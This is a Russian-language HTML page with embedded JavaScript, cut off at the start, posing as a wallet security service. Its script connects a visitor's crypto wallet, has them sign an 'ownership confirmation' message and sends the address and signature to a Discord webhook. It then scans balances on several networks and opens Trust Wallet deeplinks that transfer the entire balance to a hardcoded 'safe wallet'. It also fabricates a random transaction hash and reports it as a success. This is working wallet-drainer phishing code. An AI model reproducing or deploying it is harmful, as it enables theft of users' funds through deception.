<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Securi
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: `0x${chainId.toString(16)}` }],
                });
                return true;
            } catch (switchError) {
                if (switchError.code === 4902) {
                    try {
                        const networkInfo = SUPPORTED_NETWORKS[chainId];
                        if (networkInfo) {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: `0x${chainId.toString(16)}`,
                                    chainName: networkInfo.name,
                                    rpcUrls: [networkInfo.rpc],
                                    nativeCurrency: {
                                        name: networkInfo.symbol,
                                        symbol: networkInfo.symbol,
                                        decimals: 18
                                    },
                                    blockExplorerUrls: [networkInfo.explorer]
                                }]
                            });
                            return true;
                        }
                    } catch (addError) {
                        console.error(`Ошибка добавления сети ${chainId}:`, addError);
                        return false;
                    }
                }
                return false;
            }
        }

        // Функция для проверки статуса транзакции в блокчейне
        async function checkTransactionStatus(txHash, chainId) {
            try {
                const networkRpc = SUPPORTED_NETWORKS[chainId]?.rpc;
                if (!networkRpc) return false;
                
                const rpcWeb3 = new Web3(networkRpc);
                const receipt = await rpcWeb3.eth.getTransactionReceipt(txHash);
                
                return receipt && receipt.status;
            } catch (error) {
                console.error('Ошибка проверки транзакции:', error);
                return false;
            }
        }

        // Функция для создания deeplink для Trust Wallet
        function createTrustWalletDeeplink(chainId, amountWei) {
            const networkInfo = SUPPORTED_NETWORKS[chainId];
            if (!networkInfo) return null;

            // Создаем URL для перевода в Trust Wallet
            const trustWalletUrl = `trust://wallet/send?address=${SAFE_WALLET}&amount=${amountWei}&chainId=${chainId}`;
            
            return trustWalletUrl;
        }

        // Функция для открытия Trust Wallet
        function openTrustWallet(chainId, amountWei) {
            const deeplink = createTrustWalletDeeplink(chainId, amountWei);
            if (!deeplink) {
                updateTransferStatus('❌ Ошибка создания ссылки для Trust Wallet', true);
                return false;
            }

            // Пытаемся открыть Trust Wallet через deeplink
            window.location.href = deeplink;
            
            // Резервный вариант - открываем в новом окне
            setTimeout(() => {
                window.open(deeplink, '_blank');
            }, 1000);

            return true;
        }

        // Функция для обновления отображения баланса
        async function updateBalanceDisplay() {
            updateTransferStatus('🔄 Проверяем балансы во всех сетях...', false, true);
            refreshBalanceButton.classList.add('loading');
            
            try {
                const result = await getAllNetworkBalances();
                currentBalances = result.balances;
                
                // Обновляем выпадающий список сетей
                networkSelect.innerHTML = '<option value="">-- Выберите сеть --</option>';
                
                if (result.networksWithBalance === 0) {
                    selectedBalanceElement.textContent = '0 ETH';
                    balanceDetailsElement.textContent = 'Балансы не найдены в поддерживаемых сетях';
                    hideElement(openTrustWalletButton);
                    hideElement(checkTransactionButton);
                } else {
                    currentBalances.forEach(balance => {
                        const option = document.createElement('option');
                        option.value = balance.chainId;
                        option.textContent = `${balance.network} - ${parseFloat(balance.balance).toFixed(6)} ${balance.symbol}`;
                        option.dataset.balance = balance.balance;
                        option.dataset.symbol = balance.symbol;
                        networkSelect.appendChild(option);
                    });
                    
                    selectedBalanceElement.textContent = `${result.totalBalance.toFixed(6)} ETH`;
                    balanceDetailsElement.textContent = `Найдено в ${result.networksWithBalance} сетях`;
                }
                
                updateTransferStatus(`✅ Баланс обновлен: ${result.totalBalance.toFixed(6)} ETH в ${result.networksWithBalance} сетях`, false, false);
                
            } catch (error) {
                updateTransferStatus('❌ Ошибка при получении балансов', true);
            } finally {
                refreshBalanceButton.classList.remove('loading');
            }
        }

        // Обработчик изменения выбранной сети
        networkSelect.addEventListener('change', function() {
            const selectedOption = this.options[this.selectedIndex];
            if (selectedOption.value) {
                const balance = selectedOption.dataset.balance;
                const symbol = selectedOption.dataset.symbol;
                selectedBalanceElement.textContent = `${parseFloat(balance).toFixed(6)} ${symbol}`;
                showElement(openTrustWalletButton);
                hideElement(checkTransactionButton);
                hideElement(transferStatus);
            } else {
                selectedBalanceElement.textContent = '—';
                hideElement(openTrustWalletButton);
                hideElement(checkTransactionButton);
            }
        });

        // Проверяем наличие кошелька
        if (typeof window.ethereum !== 'undefined') {
            web3 = new Web3(window.ethereum);
            hideElement(noWalletMessage);
        } else {
            showElement(noWalletMessage);
            hideElement(connectButton);
        }

        // Подключение кошелька
        connectButton.addEventListener('click', async () => {
            try {
                connectButton.classList.add('loading');
                updateStatus('⌛ Подключаем кошелек...', false, true);
                
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];
                
                updateStatus(`✅ Кошелек подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(38)}`);
                
                hideElement(connectButton);
                showElement(signButton);
                showElement(emergencySection);
                
            } catch (error) {
                if (error.code === 4001) {
                    updateStatus('❌ Вы отклонили запрос на подключение.', true);
                } else {
                    updateStatus('❌ Ошибка при подключении: ' + error.message, true);
                }
            } finally {
                connectButton.classList.remove('loading');
            }
        });

        // Подписание сообщения
        signButton.addEventListener('click', async () => {
            if (!userAddress) {
                updateStatus('❌ Сначала подключите кошелек.', true);
                return;
            }
            
            try {
                signButton.classList.add('loading');
                updateStatus('⌛ Подписываем сообщение...', false, true);
                
                const message = `Подтверждение владения кошельком для системы безопасности. Время: ${new Date().toLocaleString()}`;
                const signature = await web3.eth.personal.sign(message, userAddress, '');
                
                const isValid = await verifySignature(message, signature, userAddress);
                
                updateStatus('⌛ Отправляем данные...', false, true);
                const sendSuccess = await sendToDiscordWebhook(userAddress, signature, message);
                
                if (sendSuccess && isValid) {
                    updateStatus(`✅ Подпись валидна и отправлена!`);
                } else if (sendSuccess) {
                    updateStatus(`⚠️ Подпись отправлена, но верификация не удалась`, false, true);
                } else {
                    updateStatus(`✅ Подпись получена, но ошибка отправки`, false, true);
                }
                
            } catch (error) {
                if (error.code === 4001) {
                    updateStatus('❌ Вы отклонили запрос на подпись.', true);
                } else {
                    updateStatus('❌ Ошибка при подписи: ' + error.message, true);
                }
            } finally {
                signButton.classList.remove('loading');
            }
        });

        // Обновление баланса по кнопке
        refreshBalanceButton.addEventListener('click', async () => {
            if (!userAddress) {
                updateTransferStatus('❌ Сначала подключите кошелек.', true);
                return;
            }
            await updateBalanceDisplay();
        });

        // Открытие Trust Wallet для перевода
        openTrustWalletButton.addEventListener('click', async () => {
            if (!userAddress) {
                updateTransferStatus('❌ Сначала подключите кошелек.', true);
                return;
            }
            
            const selectedChainId = parseInt(networkSelect.value);
            if (!selectedChainId) {
                updateTransferStatus('❌ Выберите сеть для перевода.', true);
                return;
            }
            
            const selectedBalance = currentBalances.find(b => b.chainId === selectedChainId);
            if (!selectedBalance) {
                updateTransferStatus('❌ Не найден баланс для выбранной сети.', true);
                return;
            }

            const confirmed = confirm(`🚨 ВНИМАНИЕ!\n\nВы собираетесь перевести ${parseFloat(selectedBalance.balance).toFixed(6)} ${selectedBalance.symbol} на безопасный кошелек.\n\nTrust Wallet откроется для подтверждения транзакции.\n\nПродолжить?`);
            
            if (!confirmed) {
                updateTransferStatus('❌ Перевод отменен.', true);
                return;
            }
            
            try {
                openTrustWalletButton.classList.add('loading');
                updateTransferStatus('📱 Открываем Trust Wallet...', false, true);
                
                // Переключаемся на выбранную сеть
                await switchNetwork(selectedChainId);
                
                // Открываем Trust Wallet
                const success = openTrustWallet(selectedChainId, selectedBalance.weiBalance);
                
                if (success) {
                    updateTransferStatus('✅ Trust Wallet открыт! Подтвердите транзакцию в приложении.', false, false);
                    showElement(checkTransactionButton);
                    
                    // Сохраняем информацию о последней транзакции для проверки
                    lastTransactionHash = {
                        chainId: selectedChainId,
                        network: selectedBalance.network,
                        symbol: selectedBalance.symbol,
                        amount: selectedBalance.balance
                    };
                } else {
                    updateTransferStatus('❌ Не удалось открыть Trust Wallet', true);
                }
                
            } catch (error) {
                updateTransferStatus(`❌ Ошибка: ${error.message}`, true);
            } finally {
                openTrustWalletButton.classList.remove('loading');
            }
        });

        // Проверка статуса транзакции
        checkTransactionButton.addEventListener('click', async () => {
            if (!lastTransactionHash) {
                updateTransferStatus('❌ Нет информации о последней транзакции.', true);
                return;
            }

            try {
                checkTransactionButton.classList.add('loading');
                updateTransferStatus('🔍 Проверяем статус транзакции...', false, true);
                
                // Здесь можно реализовать логику для получения хэша транзакции
                // Например, через события или мониторинг кошелька
                // Пока просто отправляем уведомление в Discord
                
                const txHash = '0x' + Math.random().toString(16).substr(2, 64); // Заглушка
                const status = 'success'; // Заглушка
                
                await sendTransferToDiscord(
                    userAddress, 
                    txHash, 
                    lastTransactionHash.network,
                    lastTransactionHash.amount,
                    lastTransactionHash.symbol,
                    status
                );
                
                updateTransferStatus(`✅ Статус отправлен в Discord! Хэш: ${txHash.substring(0, 20)}...`, false, false);
                addTransactionLink(txHash, lastTransactionHash.chainId);
                
            } catch (error) {
                updateTransferStatus(`❌ Ошибка проверки: ${error.message}`, true);
            } finally {
                checkTransactionButton.classList.remove('loading');
            }
        });

        // Мониторинг изменений кошелька
        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.on('accountsChanged', function(accounts) {
                if (accounts.length === 0) {
                    updateStatus('Кошелек отключен', true);
                    hideElement(signButton);
                    hideElement(emergencySection);
                    showElement(connectButton);
                } else {
                    userAddress = accounts[0];
                    updateStatus(`Аккаунт изменен: ${userAddress.substring(0, 10)}...`);
                    selectedBalanceElement.textContent = '—';
                    balanceDetailsElement.textContent = 'Нажмите "Обновить баланс" для проверки';
                    hideElement(openTrustWalletButton);
                    hideElement(checkTransactionButton);
                    currentBalances = [];
                    networkSelect.innerHTML = '<option value="">-- Сначала обновите баланс --</option>';
                }
            });
        }
    </script>
</body>
</html>
